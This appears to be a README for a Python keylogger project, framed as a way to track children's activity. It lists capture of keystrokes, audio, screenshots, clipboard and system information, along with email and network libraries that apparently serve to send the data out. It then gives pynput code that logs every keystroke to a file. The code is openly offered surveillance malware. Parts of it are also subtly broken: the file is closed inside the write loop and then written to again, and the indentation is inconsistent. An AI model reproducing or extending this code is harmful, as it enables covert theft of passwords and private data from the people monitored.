# Advanced_Keylogger
# AIM  
To track kids activity including keystrokes, audio, screenshots, clipboard data and System information

# COMPONENTS REQUIRED  
1. Pycharm IDE
2. Downloading necessary packages/libraries:
   * email
   * smtplib
   * socket
   * platform
   * win32clipboard
   * pynput
   * time
   * os
   * scipy
   * sounddevice
   * cryptography
   * requests
   * PIL
3. System with minimum 4GB RAM

# PROGRAM  

## Keylogger Functionality

count = 0
    keys = []

    def on_press(key):
        global keys,count,currentTime

        print(key)
        keys.append(key)
        count+=1
        currentTime = time.time()

        if count >= 1: # to continously write keys to the log file
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key): # To exit the keylogger
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
